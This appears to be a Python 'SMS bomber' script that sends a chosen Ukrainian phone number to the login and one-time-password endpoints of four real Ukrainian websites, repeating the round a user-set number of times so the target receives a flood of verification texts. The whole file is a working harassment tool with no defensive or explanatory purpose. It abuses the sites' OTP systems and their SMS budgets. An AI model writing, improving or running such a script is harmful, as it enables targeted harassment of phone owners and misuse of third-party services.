import random
import time

import requests
from selenium import webdriver
from selenium.webdriver.common.by import By


def bombrer(number):
    try:

        c = requests.post("https://automoto.ua/uk/my-office/login", json={"phone": f"38 0" + number})
        print(c.text)
        time.sleep(0.1)
        cc = requests.post("https://ucb.z.apteka24.ua/api/send/otp", json={"phone": f"380" + number})
        print(cc.text)
        time.sleep(0.1)
        ccc = requests.post("https://my.lun.ua/api/user/login", json={"login": f"{number}"})
        print(ccc.text)
        time.sleep(0.1)
        cccc = requests.post("https://account.kyivstar.ua/cas/new/api/otp/send?locale=uk",
                             json={"action": "registration", "captcha": None, "login": f"380{number}"})
        print(cccc.text)

    except Exception as e:
        print(e)


def main(user_input_number, user_input_h):
    user_input_howMuch = int(user_input_h)
    for i in range(user_input_howMuch):
        bombrer(user_input_number)
        time.sleep(60)
